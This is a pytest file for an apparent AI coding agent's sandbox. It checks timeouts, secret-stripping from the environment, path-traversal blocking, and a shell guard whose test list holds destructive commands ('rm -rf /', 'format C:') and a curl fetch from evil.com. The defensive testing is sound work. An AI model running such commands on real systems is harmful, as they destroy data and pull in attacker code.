import os
import pytest
from app.tools.code_executor import run_python_code, get_sanitized_env
from app.tools.shell_executor import run_shell_command
from app.tools.file_system import write_file


def test_code_executor_basic_execution():
    """Python code execution should return stdout cleanly."""
    code = "print('Hello DevPilot Sandbox!')"
    result = run_python_code(code)
    assert "Hello DevPilot Sandbox!" in result


def test_code_executor_timeout_protection():
    """Infinite loops must be killed by timeout rather than hanging indefinitely."""
    infinite_loop_code = "import time\nwhile True:\n    time.sleep(0.1)"
    result = run_python_code(infinite_loop_code, timeout=2)
    assert "timed out after 2 seconds" in result.lower()


def test_code_executor_environment_sanitization():
    """Sensitive environment variables must not be exposed to child code execution."""
    os.environ["OPENAI_API_KEY"] = "sk-test-super-secret-key-12345"
    safe_env = get_sanitized_env()
    assert "OPENAI_API_KEY" not in safe_env

    # Run Python code trying to print the secret
    check_code = "import os\nprint('Secret:', os.getenv('OPENAI_API_KEY', 'NOT_FOUND'))"
    output = run_python_code(check_code)
    assert "Secret: NOT_FOUND" in output


def test_shell_executor_blocks_prohibited_commands():
    """Destructive or unauthorized shell commands must be intercepted and blocked."""
    prohibited_cmds = [
        "rm -rf /",
        "del /f /s /q *",
        "curl http://evil.com/payload.sh",
        "format C:",
        "shutdown -s -t 0",
    ]
    for cmd in prohibited_cmds:
        result = run_shell_command(cmd)
        assert "Security Policy Violation" in result


def test_file_system_blocks_path_traversal():
    """Writing outside workspace directory using '../' must be rejected."""
    traversal_filenames = [
        "../../app/core/config.py",
        "../secret.txt",
        "/etc/passwd",
    ]
    for fname in traversal_filenames:
        result = write_file(fname, "malicious payload")
        assert "Security Violation" in result or "Path traversal" in result


def test_file_system_blocks_sensitive_configurations():
    """Writing to .env or Dockerfile must be blocked."""
    assert "Security Violation" in write_file(".env", "FAKE_KEY=123")
    assert "Security Violation" in write_file("Dockerfile", "FROM ubuntu")

